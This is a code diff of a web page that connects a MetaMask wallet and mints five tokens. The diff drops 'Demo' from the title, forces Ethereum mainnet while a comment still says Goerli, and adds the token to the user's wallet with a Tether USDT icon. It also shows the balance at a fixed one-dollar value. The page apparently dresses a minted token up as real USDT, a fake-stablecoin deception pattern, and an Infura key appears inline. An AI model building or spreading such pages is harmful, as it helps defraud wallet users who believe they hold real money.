@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="utf-8" />
-  <title>Claim 5 Demo Coins — Debug Version</title>
+  <title>Claim 5  Coins — Debug Version</title>
   <style>
     body { font-family: Arial, sans-serif; padding: 18px; }
     button { padding: 8px 12px; margin-right: 8px; }
@@ -11,18 +11,18 @@
   </style>
 </head>
 <body>
-  <h1>Claim 5 Demo Coins — Debug</h1>
+  <h1>Claim 5  Coins — Debug</h1>
   <button id="connectBtn">Connect Wallet</button>
   <button id="claimBtn" disabled>Claim Now (mint 5)</button>
 
   <div id="status">Status: waiting</div>
-  
-  <!-- ✅ Added missing UI elements -->
+
+  <!-- ✅ Balance UI -->
   <div id="balances">
     Balance: <span id="balance">0</span> <span id="sym"></span>
     (~$<span id="value">0.00</span>)
   </div>
-  
+
   <div id="log"></div>
 
   <!-- MetaMask SDK (fallback for mobile) -->
@@ -38,10 +38,23 @@
   const tokenImage   = "https://png.pngtree.com/png-vector/20220513/ourmid/pngtree-tetherusdtvector-illustration-of-a-wellknown-altcoin-cryptocurrency-icon-vector-png-image_36462248.png";
   const mintAmount   = ethers.utils.parseUnits("5", tokenDecimals); // 5 tokens
   const tokenPrice   = 1;
-  const requiredChainIdHex = null; // example: '0x5' for Goerli
+
+  // ⚠️ Example: Goerli testnet, change to your own
+  const requiredChainIdHex = "0x1"; // Goerli = 0x5
+  const requiredChainConfig = {
+    chainId: requiredChainIdHex,
+    chainName: "Ethereum",
+    nativeCurrency: {
+      name: "Ethereum",
+      symbol: "ETH",
+      decimals: 18
+    },
+    rpcUrls: ["https://mainnet.infura.io/v3/1e9849934a564257b9a2c77ece0b15c5"], // <-- replace
+    blockExplorerUrls: ["https://etherscan.io"]
+  };
   /**********************************************************/
 
-  // Grab DOM elements
+  // DOM references
   const connectBtn = document.getElementById("connectBtn");
   const claimBtn   = document.getElementById("claimBtn");
   const logEl      = document.getElementById("log");
@@ -86,11 +99,13 @@
     return false;
   }
 
+  // ✅ Connect wallet flow
   async function connectWallet(){
     try {
       setStatus('Initializing provider...');
       if (!initProvider()) return;
 
+      // Request account connection
       setStatus('Requesting account access...');
       await ethereum.request({ method: 'eth_requestAccounts' });
       signer = provider.getSigner();
@@ -98,14 +113,56 @@
       log('Connected address:', userAddress);
       setStatus('Connected: ' + userAddress.slice(0,8) + '...');
 
+      // Switch or add network
+      if (requiredChainIdHex) {
+        try {
+          await ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: requiredChainIdHex }]
+          });
+          log('Switched to chain:', requiredChainIdHex);
+        } catch (switchError) {
+          if (switchError.code === 4902) {
+            await ethereum.request({
+              method: 'wallet_addEthereumChain',
+              params: [requiredChainConfig]
+            });
+          } else {
+            throw switchError;
+          }
+        }
+      }
+
+      // Attach contracts
       tokenContractProvider = new ethers.Contract(tokenAddress, tokenAbi, provider);
       tokenContractSigner   = new ethers.Contract(tokenAddress, tokenAbi, signer);
 
       symEl.innerText = tokenSymbol;
       claimBtn.disabled = false;
 
+      // Ask to add token to wallet
+      try {
+        const wasAdded = await ethereum.request({
+          method: 'wallet_watchAsset',
+          params: {
+            type: 'ERC20',
+            options: {
+              address: tokenAddress,
+              symbol: tokenSymbol,
+              decimals: tokenDecimals,
+              image: tokenImage
+            },
+          },
+        });
+        log('Token added to wallet?', wasAdded);
+      } catch (e) {
+        log('wallet_watchAsset error:', e);
+      }
+
+      // Fetch balance
       await updateBalance();
 
+      // Listen to transfers
       tokenContractProvider.removeAllListeners("Transfer");
       tokenContractProvider.on("Transfer", async (from, to, value) => {
         if (from.toLowerCase() === userAddress.toLowerCase() || to.toLowerCase() === userAddress.toLowerCase()){
@@ -117,9 +174,11 @@
       console.error(err);
       setStatus('Connect failed');
       log('Connect error:', err);
+      alert('Connect failed: ' + (err.message || err));
     }
   }
 
+  // ✅ Claim tokens
   async function claimDemoCoins(){
     try {
       if (!tokenContractSigner || !signer) {
@@ -143,6 +202,7 @@
     }
   }
 
+  // ✅ Balance update
   async function updateBalance(){
     try {
       if (!tokenContractProvider || !userAddress) return;
